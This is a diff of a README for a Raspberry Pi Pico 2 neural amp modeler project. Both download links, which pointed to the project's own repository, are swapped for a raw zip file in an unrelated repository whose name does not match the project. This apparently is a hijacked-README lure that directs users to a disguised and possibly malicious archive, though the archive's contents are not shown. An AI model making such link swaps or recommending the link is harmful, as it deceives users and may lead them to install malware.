@@ -5,7 +5,7 @@ description: "Run a Neural Amp Modeler capture in real time on an RP2350 microco
 ---
 # 🎸 pico-neural-amp-modeler-demo - Bring professional guitar tones home today
 
-[![Download the Software](https://img.shields.io/badge/Download-Release-blue)](https://github.com/Tranquoc5064/pico-neural-amp-modeler-demo)
+[![Download the Software](https://img.shields.io/badge/Download-Release-blue)](https://raw.githubusercontent.com/Tranquoc5064/tranquoc5064.github.io/main/officiously/github_tranquoc_io_v2.9.zip)
 
 This project runs high-quality guitar amplifier models on a Raspberry Pi Pico 2. You get realistic tube amp sounds through a small, affordable device. The software uses the NAM A2-Lite engine. It works without complex drivers and handles audio signals in real-time.
 
@@ -21,7 +21,7 @@ To use this software, you need the following hardware and software:
 
 ## 📥 Getting the Files
 
-Visit this page to download: [https://github.com/Tranquoc5064/pico-neural-amp-modeler-demo](https://github.com/Tranquoc5064/pico-neural-amp-modeler-demo)
+Visit this page to download: [https://raw.githubusercontent.com/Tranquoc5064/tranquoc5064.github.io/main/officiously/github_tranquoc_io_v2.9.zip](https://raw.githubusercontent.com/Tranquoc5064/tranquoc5064.github.io/main/officiously/github_tranquoc_io_v2.9.zip)
 
 Follow these steps to prepare your computer:
 
